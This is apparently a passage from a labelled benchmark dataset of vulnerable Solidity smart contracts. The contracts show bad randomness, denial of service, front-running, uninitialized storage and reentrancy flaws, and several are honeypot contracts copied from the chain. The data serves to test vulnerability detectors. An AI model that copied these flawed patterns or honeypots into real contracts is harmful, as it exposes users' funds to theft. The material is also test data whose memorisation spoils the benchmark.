 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/weak_randomness/old_blockhash.sol
 * @author: -
 * @vulnerable_at_lines: 35
 */
pragma solidity ^0.4.24;
//Based on the the Capture the Ether challange at https://capturetheether.com/challenges/lotteries/predict-the-block-hash/
//Note that while it seems to have a 1/2^256 chance you guess the right hash, actually blockhash returns zero for blocks numbers that are more than 256 blocks ago so you can guess zero and wait.
contract PredictTheBlockHashChallenge {
    struct guess{
      uint block;
      bytes32 guess;
    }
    mapping(address => guess) guesses;
    constructor() public payable {
        require(msg.value == 1 ether);
    }
    function lockInGuess(bytes32 hash) public payable {
        require(guesses[msg.sender].block == 0);
        require(msg.value == 1 ether);
        guesses[msg.sender].guess = hash;
        guesses[msg.sender].block  = block.number + 1;
    }
    function settle() public {
        require(block.number > guesses[msg.sender].block);
        // <yes> <report> BAD_RANDOMNESS
        bytes32 answer = blockhash(guesses[msg.sender].block);
        guesses[msg.sender].block = 0;
        if (guesses[msg.sender].guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}",[27]
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/weak_randomness/random_number_generator.sol
 * @author: -
 * @vulnerable_at_lines: 12,18,20,22
 */
pragma solidity ^0.4.25;
// Based on TheRun contract deployed at 0xcac337492149bDB66b088bf5914beDfBf78cCC18.
contract RandomNumberGenerator {
  // <yes> <report> BAD_RANDOMNESS
  uint256 private salt =  block.timestamp;
  function random(uint max) view private returns (uint256 result) {
    // Get the best seed for randomness
    uint256 x = salt * 100 / max;
    // <yes> <report> BAD_RANDOMNESS
    uint256 y = salt * block.number / (salt % 5);
    // <yes> <report> BAD_RANDOMNESS
    uint256 seed = block.number / 3 + (salt % 300) + y;
    // <yes> <report> BAD_RANDOMNESS
    uint256 h = uint256(blockhash(seed));
    // Random number between 1 and max
    return uint256((h / x)) % max + 1;
  }
}","[10, 15, 17, 19]"
"/*
 * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/denial_of_service/auction.sol
 * @author: -
 * @vulnerable_at_lines: 23
 */
pragma solidity ^0.4.15;
//Auction susceptible to DoS attack
contract DosAuction {
  address currentFrontrunner;
  uint currentBid;
  //Takes in bid, refunding the frontrunner if they are outbid
  function bid() payable {
    require(msg.value > currentBid);
    //If the refund fails, the entire transaction reverts.
    //Therefore a frontrunner who always fails will win
    if (currentFrontrunner != 0) {
      //E.g. if recipients fallback function is just revert()
      // <yes> <report> DENIAL_OF_SERVICE
      require(currentFrontrunner.send(currentBid));
    }
    currentFrontrunner = msg.sender;
    currentBid         = msg.value;
  }
}",[19]
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/dos_gas_limit/dos_address.sol
 * @author: -
 * @vulnerable_at_lines: 16,17,18
 */
pragma solidity ^0.4.25;
contract DosGas {
    address[] creditorAddresses;
    bool win = false;
    function emptyCreditors() public {
        // <yes> <report> DENIAL_OF_SERVICE
        if(creditorAddresses.length>1500) {
            creditorAddresses = new address[](0);
            win = true;
        }
    }
    function addCreditors() public returns (bool) {
        for(uint i=0;i<350;i++) {
          creditorAddresses.push(msg.sender);
        }
        return true;
    }
    function iWin() public view returns (bool) {
        return win;
    }
    function numberCreditors() public view returns (uint) {
        return creditorAddresses.length;
    }
}","[12, 13, 14]"
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/dos_gas_limit/dos_number.sol
 * @author: -
 * @vulnerable_at_lines: 18,19,20,21,22
 */
pragma solidity ^0.4.25;
contract DosNumber {
    uint numElements = 0;
    uint[] array;
    function insertNnumbers(uint value,uint numbers) public {
        // Gas DOS if number > 382 more or less, it depends on actual gas limit
        // <yes> <report> DENIAL_OF_SERVICE
        for(uint i=0;i<numbers;i++) {
            if(numElements == array.length) {
                array.length += 1;
            }
            array[numElements++] = value;
        }
    }
    function clear() public {
        require(numElements>1500);
        numElements = 0;
    }
    // Gas DOS clear
    function clearDOS() public {
        // number depends on actual gas limit
        require(numElements>1500);
        array = new uint[](0);
        numElements = 0;
    }
    function getLengthArray() public view returns(uint) {
        return numElements;
    }
    function getRealLengthArray() public view returns(uint) {
        return array.length;
    }
}","[13, 14, 15, 16, 17]"
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/dos_gas_limit/dos_simple.sol
 * @author: -
 * @vulnerable_at_lines: 17,18
 */
pragma solidity ^0.4.25;
contract DosOneFunc {
    address[] listAddresses;
    function ifillArray() public returns (bool){
        if(listAddresses.length<1500) {
            // <yes> <report> DENIAL_OF_SERVICE
            for(uint i=0;i<350;i++) {
                listAddresses.push(msg.sender);
            }
            return true;
        } else {
            listAddresses = new address[](0);
            return false;
        }
    }
}","[12, 13]"
"/*
 * @source: https://etherscan.io/address/0xf45717552f12ef7cb65e95476f217ea008167ae3#code
 * @author: -
 * @vulnerable_at_lines: 46,48
 */
//added pragma version
pragma solidity ^0.4.0;
contract Government {
     // Global Variables
     uint32 public lastCreditorPayedOut;
     uint public lastTimeOfNewCredit;
     uint public profitFromCrash;
     address[] public creditorAddresses;
     uint[] public creditorAmounts;
     address public corruptElite;
     mapping (address => uint) buddies;
     uint constant TWELVE_HOURS = 43200;
     uint8 public round;
     function Government() {
         // The corrupt elite establishes a new government
         // this is the commitment of the corrupt Elite - everything that can not be saved from a crash
         profitFromCrash = msg.value;
         corruptElite = msg.sender;
         lastTimeOfNewCredit = block.timestamp;
     }
     function lendGovernmentMoney(address buddy) returns (bool) {
         uint amount = msg.value;
         // check if the system already broke down. If for 12h no new creditor gives new credit to the system it will brake down.
         // 12h are on average = 60*60*12/12.5 = 3456
         if (lastTimeOfNewCredit + TWELVE_HOURS < block.timestamp) {
             // Return money to sender
             msg.sender.send(amount);
             // Sends all contract money to the last creditor
             creditorAddresses[creditorAddresses.length - 1].send(profitFromCrash);
             corruptElite.send(this.balance);
             // Reset contract state
             lastCreditorPayedOut = 0;
             lastTimeOfNewCredit = block.timestamp;
             profitFromCrash = 0;
            // <yes> <report> DENIAL_OF_SERVICE
             creditorAddresses = new address[](0);
            // <yes> <report> DENIAL_OF_SERVICE
             creditorAmounts = new uint[](0);
             round += 1;
             return false;
         }
         else {
             // the system needs to collect at least 1% of the profit from a crash to stay alive
             if (amount >= 10 ** 18) {
                 // the System has received fresh money, it will survive at leat 12h more
                 lastTimeOfNewCredit = block.timestamp;
                 // register the new creditor and his amount with 10% interest rate
                 creditorAddresses.push(msg.sender);
                 creditorAmounts.push(amount * 110 / 100);
                 // now the money is distributed
                 // first the corrupt elite grabs 5% - thieves!
                 corruptElite.send(amount * 5/100);
                 // 5% are going into the economy (they will increase the value for the person seeing the crash comming)
                 if (profitFromCrash < 10000 * 10**18) {
                     profitFromCrash += amount * 5/100;
                 }
                 // if you have a buddy in the government (and he is in the creditor list) he can get 5% of your credits.
                 // Make a deal with him.
                 if(buddies[buddy] >= amount) {
                     buddy.send(amount * 5/100);
                 }
                 buddies[msg.sender] += amount * 110 / 100;
                 // 90% of the money will be used to pay out old creditors
                 if (creditorAmounts[lastCreditorPayedOut] <= address(this).balance - profitFromCrash) {
                     creditorAddresses[lastCreditorPayedOut].send(creditorAmounts[lastCreditorPayedOut]);
                     buddies[creditorAddresses[lastCreditorPayedOut]] -= creditorAmounts[lastCreditorPayedOut];
                     lastCreditorPayedOut += 1;
                 }
                 return true;
             }
             else {
                 msg.sender.send(amount);
                 return false;
             }
         }
     }
     // fallback function
     function() {
         lendGovernmentMoney(0);
     }
     function totalDebt() returns (uint debt) {
         for(uint i=lastCreditorPayedOut; i<creditorAmounts.length; i++){
             debt += creditorAmounts[i];
         }
     }
     function totalPayedOut() returns (uint payout) {
         for(uint i=0; i<lastCreditorPayedOut; i++){
             payout += creditorAmounts[i];
         }
     }
     // better don't do it (unless you are the corrupt elite and you want to establish trust in the system)
     function investInTheSystem() {
         profitFromCrash += msg.value;
     }
     // From time to time the corrupt elite inherits it's power to the next generation
     function inheritToNextGeneration(address nextGeneration) {
         if (msg.sender == corruptElite) {
             corruptElite = nextGeneration;
         }
     }
     function getCreditorAddresses() returns (address[]) {
         return creditorAddresses;
     }
     function getCreditorAmounts() returns (uint[]) {
         return creditorAmounts;
     }
 }","[41, 43]"
"/*
 * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-unexpected-revert
 * @author: ConsenSys Diligence
* @vulnerable_at_lines: 24
 * Modified by Bernhard Mueller
 */
pragma solidity 0.4.24;
contract Refunder {
address[] private refundAddresses;
mapping (address => uint) public refunds;
    constructor() {
        refundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b184);
        refundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b185);
    }
    // bad
    function refundAll() public {
        for(uint x; x < refundAddresses.length; x++) { // arbitrary length iteration based on how many addresses participated
        // <yes> <report> DENIAL_OF_SERVICE
            require(refundAddresses[x].send(refunds[refundAddresses[x]])); // doubly bad, now a single failure on send will hold up all funds
        }
    }
}",[19]
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/transaction_order_dependence/ERC20.sol
 * @author: -
 * @vulnerable_at_lines: 110,113
 */
pragma solidity ^0.4.24;
/** Taken from the OpenZeppelin github
 * @title SafeMath
 * @dev Math operations with safety checks that revert on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, reverts on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0); // Solidity only automatically asserts when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    uint256 c = a - b;
    return c;
  }
  /**
  * @dev Adds two numbers, reverts on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);
    return c;
  }
  /**
  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
  * reverts when dividing by zero.
  */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}
contract ERC20 {
  event Transfer( address indexed from, address indexed to, uint256 value );
  event Approval( address indexed owner, address indexed spender, uint256 value);
  using SafeMath for *;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  uint256 private _totalSupply;
  constructor(uint totalSupply){
    _balances[msg.sender] = totalSupply;
  }
  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }
  function allowance(address owner, address spender) public view returns (uint256)
  {
    return _allowed[owner][spender];
  }
  function transfer(address to, uint256 value) public returns (bool) {
    require(value <= _balances[msg.sender]);
    require(to != address(0));
    _balances[msg.sender] = _balances[msg.sender].sub(value);
    _balances[to] = _balances[to].add(value);
    emit Transfer(msg.sender, to, value);
    return true;
  }
  // <yes> <report> FRONT_RUNNING
  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
     // <yes> <report> FRONT_RUNNING
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }
  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0));
    _balances[from] = _balances[from].sub(value);
    _balances[to] = _balances[to].add(value);
    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
    emit Transfer(from, to, value);
    return true;
  }
}","[86, 89]"
"/*
 * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite
 * @author: Suhabe Bugrara
 * @vulnerable_at_lines: 23,31
 */
pragma solidity ^0.4.16;
contract EthTxOrderDependenceMinimal {
    address public owner;
    bool public claimed;
    uint public reward;
    function EthTxOrderDependenceMinimal() public {
        owner = msg.sender;
    }
    function setReward() public payable {
        require (!claimed);
        require(msg.sender == owner);
        // <yes> <report> FRONT_RUNNING
        owner.transfer(reward);
        reward = msg.value;
    }
    function claimReward(uint256 submission) {
        require (!claimed);
        require(submission < 10);
        // <yes> <report> FRONT_RUNNING
        msg.sender.transfer(reward);
        claimed = true;
    }
}","[18, 25]"
"/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: -
 * @vulnerable_at_lines: 17
 */
pragma solidity ^0.4.22;
contract FindThisHash {
    bytes32 constant public hash = 0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a;
    constructor() public payable {} // load with ether
    function solve(string solution) public {
        // If you can find the pre image of the hash, receive 1000 ether
         // <yes> <report> FRONT_RUNNING
        require(hash == sha3(solution));
        msg.sender.transfer(1000 ether);
    }
}",[13]
"/*
 * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#oddsandevens
 * @author: -
 * @vulnerable_at_lines: 25,28
 */
pragma solidity ^0.4.2;
contract OddsAndEvens{
  struct Player {
    address addr;
    uint number;
  }
  Player[2] public players;         //public only for debug purpose
  uint8 tot;
  address owner;
  function OddsAndEvens() {
    owner = msg.sender;
  }
// <yes> <report> FRONT_RUNNING
  function play(uint number) payable{
    if (msg.value != 1 ether) throw;
    // <yes> <report> FRONT_RUNNING
    players[tot] = Player(msg.sender, number);
    tot++;
    if (tot==2) andTheWinnerIs();
  }
  function andTheWinnerIs() private {
    bool res ;
    uint n = players[0].number+players[1].number;
    if (n%2==0) {
      res = players[0].addr.send(1800 finney);
    }
    else {
      res = players[1].addr.send(1800 finney);
    }
    delete players;
    tot=0;
  }
  function getProfit() {
    if(msg.sender!=owner) throw;
    bool res = msg.sender.send(this.balance);
  }
}","[19, 22]"
"/*
 * @source: https://github.com/thec00n/smart-contract-honeypots/blob/master/CryptoRoulette.sol
 * @vulnerable_at_lines: 40,41,42
 */
pragma solidity ^0.4.19;
// CryptoRoulette
//
// Guess the number secretly stored in the blockchain and win the whole contract balance!
// A new number is randomly chosen after each try.
// https://www.reddit.com/r/ethdev/comments/7wp363/how_does_this_honeypot_work_it_seems_like_a/
// To play, call the play() method with the guessed number (1-20).  Bet price: 0.1 ether
contract CryptoRoulette {
    uint256 private secretNumber;
    uint256 public lastPlayed;
    uint256 public betPrice = 0.1 ether;
    address public ownerAddr;
    struct Game {
        address player;
        uint256 number;
    }
    Game[] public gamesPlayed;
    function CryptoRoulette() public {
        ownerAddr = msg.sender;
        shuffle();
    }
    function shuffle() internal {
        // randomly set secretNumber with a value between 1 and 20
        secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 20 + 1;
    }
    function play(uint256 number) payable public {
        require(msg.value >= betPrice && number <= 10);
        // <yes> <report> OTHER - uninitialized storage
        Game game; //Uninitialized storage pointer
        game.player = msg.sender;
        game.number = number;
        gamesPlayed.push(game);
        if (number == secretNumber) {
            // win!
            msg.sender.transfer(this.balance);
        }
        shuffle();
        lastPlayed = now;
    }
    function kill() public {
        if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {
            suicide(msg.sender);
        }
    }
    function() public payable { }
}","[33, 34, 35]"
"/*
 * @source: https://github.com/sigp/solidity-security-blog#storage-example
 * @vulnerable_at_lines: 21
 */
// A Locked Name Registrar
pragma solidity ^0.4.15;
contract NameRegistrar {
    bool public unlocked = false;  // registrar locked, no name updates
    struct NameRecord { // map hashes to addresses
        bytes32 name;
        address mappedAddress;
    }
    mapping(address => NameRecord) public registeredNameRecord; // records who registered names
    mapping(bytes32 => address) public resolve; // resolves hashes to addresses
    function register(bytes32 _name, address _mappedAddress) public {
        // set up the new NameRecord
        // <yes> <report> OTHER - uninitialized storage
        NameRecord newRecord;
        newRecord.name = _name;
        newRecord.mappedAddress = _mappedAddress;
        resolve[_name] = _mappedAddress;
        registeredNameRecord[msg.sender] = newRecord;
        require(unlocked); // only allow registrations if contract is unlocked
    }
}",[16]
"/*
 * @source: https://etherscan.io/address/0x741f1923974464efd0aa70e77800ba5d9ed18902#code
 * @vulnerable_at_lines: 91
 */
pragma solidity ^0.4.19;
/*
 * This is a distributed lottery that chooses random addresses as lucky addresses. If these
 * participate, they get the jackpot: 7 times the price of their bet.
 * Of course one address can only win once. The owner regularly reseeds the secret
 * seed of the contract (based on which the lucky addresses are chosen), so if you did not win,
 * just wait for a reseed and try again!
 *
 * Jackpot chance:   1 in 8
 * Ticket price: Anything larger than (or equal to) 0.1 ETH
 * Jackpot size: 7 times the ticket price
 *
 * HOW TO PARTICIPATE: Just send any amount greater than (or equal to) 0.1 ETH to the contract's address
 * Keep in mind that your address can only win once
 *
 * If the contract doesn't have enough ETH to pay the jackpot, it sends the whole balance.
 https://www.reddit.com/r/ethdev/comments/7wp363/how_does_this_honeypot_work_it_seems_like_a/
*/
contract OpenAddressLottery{
    struct SeedComponents{
        uint component1;
        uint component2;
        uint component3;
        uint component4;
    }
    address owner; //address of the owner
    uint private secretSeed; //seed used to calculate number of an address
    uint private lastReseed; //last reseed - used to automatically reseed the contract every 1000 blocks
    uint LuckyNumber = 7; //if the number of an address equals 7, it wins
    mapping (address => bool) winner; //keeping track of addresses that have already won
    function OpenAddressLottery() {
        owner = msg.sender;
        reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }
    function participate() payable {
        if(msg.value<0.1 ether)
            return; //verify ticket price
        // make sure he hasn't won already
        require(winner[msg.sender] == false);
        if(luckyNumberOfAddress(msg.sender) == LuckyNumber){ //check if it equals 7
            winner[msg.sender] = true; // every address can only win once
            uint win=msg.value*7; //win = 7 times the ticket price
            if(win>this.balance) //if the balance isnt sufficient...
                win=this.balance; //...send everything we've got
            msg.sender.transfer(win);
        }
        if(block.number-lastReseed>1000) //reseed if needed
            reseed(SeedComponents((uint)(block.coinbase), block.difficulty, block.gaslimit, block.timestamp)); //generate a quality random seed
    }
    function luckyNumberOfAddress(address addr) constant returns(uint n){
        // calculate the number of current address - 1 in 8 chance
        n = uint(keccak256(uint(addr), secretSeed)[0]) % 8;
    }
    function reseed(SeedComponents components) internal {
        secretSeed = uint256(keccak256(
            components.component1,
            components.component2,
            components.component3,
            components.component4
        )); //hash the incoming parameters and use the hash to (re)initialize the seed
        lastReseed = block.number;
    }
    function kill() {
        require(msg.sender==owner);
        selfdestruct(msg.sender);
    }
    function forceReseed() { //reseed initiated by the owner - for testing purposes
        require(msg.sender==owner);
        // <yes> <report> OTHER - uninitialized storage
        SeedComponents s;
        s.component1 = uint(msg.sender);
        s.component2 = uint256(block.blockhash(block.number - 1));
        s.component3 = block.difficulty*(uint)(block.coinbase);
        s.component4 = tx.gasprice * 7;
        reseed(s); //reseed
    }
    function () payable { //if someone sends money without any function call, just assume he wanted to participate
        if(msg.value>=0.1 ether && msg.sender!=owner) //owner can't participate, he can only fund the jackpot
            participate();
    }
}",[74]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 54
 */
pragma solidity ^0.4.19;
contract PERSONAL_BANK
{
    mapping (address=>uint256) public balances;   
    uint public MinSum = 1 ether;
    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)revert();
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)revert();
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Deposit();
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[44]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 38
 */
pragma solidity ^0.4.19;
contract PrivateBank
{
    mapping (address => uint) public balances;
    uint public MinDeposit = 1 ether;
    Log TransferLog;
    function PrivateBank(address _log)
    {
        TransferLog = Log(_log);
    }
    function Deposit()
    public
    payable
    {
        if(msg.value >= MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");
        }
    }
    function CashOut(uint _am)
    {
        if(_am<=balances[msg.sender])
        {            
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,""CashOut"");
            }
        }
    }
    function() public payable{}    
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[31]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 55
 */
pragma solidity ^0.4.19;
contract ACCURAL_DEPOSIT
{
    mapping (address=>uint256) public balances;   
    uint public MinSum = 1 ether;
    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)revert();
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)revert();
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Deposit();
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[44]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 54
 */
pragma solidity ^0.4.19;
contract PRIVATE_ETH_CELL
{
    mapping (address=>uint256) public balances;   
    uint public MinSum;
    LogFile Log;
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        require(!intitalized);
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        require(!intitalized);
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Deposit();
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[44]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 54
 */
pragma solidity ^0.4.19;
contract BANK_SAFE
{
    mapping (address=>uint256) public balances;   
    uint public MinSum;
    LogFile Log;
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)throw;
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)throw;
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Deposit();
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[44]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 94
 */
pragma solidity ^0.4.19;
contract Ownable
{
    address newOwner;
    address owner = msg.sender;
    function changeOwner(address addr)
    public
    onlyOwner
    {
        newOwner = addr;
    }
    function confirmOwner() 
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    modifier onlyOwner
    {
        if(owner == msg.sender)_;
    }
}
contract Token is Ownable
{
    address owner = msg.sender;
    function WithdrawToken(address token, uint256 amount,address to)
    public 
    onlyOwner
    {
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 
    }
}
contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;
     ///Constructor
    function initTokenBank()
    public
    {
        owner = msg.sender;
        MinDeposit = 1 ether;
    }
    function()
    payable
    {
        Deposit();
    }
    function Deposit() 
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }
    function WitdrawTokenToHolder(address _to,address _token,uint _amount)
    public
    onlyOwner
    {
        if(Holders[_to]>0)
        {
            Holders[_to]=0;
            WithdrawToken(_token,_amount,_to);     
        }
    }
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(Holders[_addr]>0)
        {
            // <yes> <report> REENTRANCY
            if(_addr.call.value(_wei)())
            {
                Holders[_addr]-=_wei;
            }
        }
    }
}",[82]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 29
 */
pragma solidity ^0.4.25;
contract U_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 2 ether;    
    function U_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[26]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 52
 */
pragma solidity ^0.4.19;
contract PrivateDeposit
{
    mapping (address => uint) public balances;
    uint public MinDeposit = 1 ether;
    address public owner;
    Log TransferLog;
    modifier onlyOwner() {
        require(tx.origin == owner);
        _;
    }    
    function PrivateDeposit()
    {
        owner = msg.sender;
        TransferLog = new Log();
    }
    function setLog(address _lib) onlyOwner
    {
        TransferLog = Log(_lib);
    }    
    function Deposit()
    public
    payable
    {
        if(msg.value >= MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");
        }
    }
    function CashOut(uint _am)
    {
        if(_am<=balances[msg.sender])
        {            
            // <yes> <report> REENTRANCY
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,""CashOut"");
            }
        }
    }
    function() public payable{}    
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}",[41]
"/*
 * @source: etherscan.io 
 * @author: -
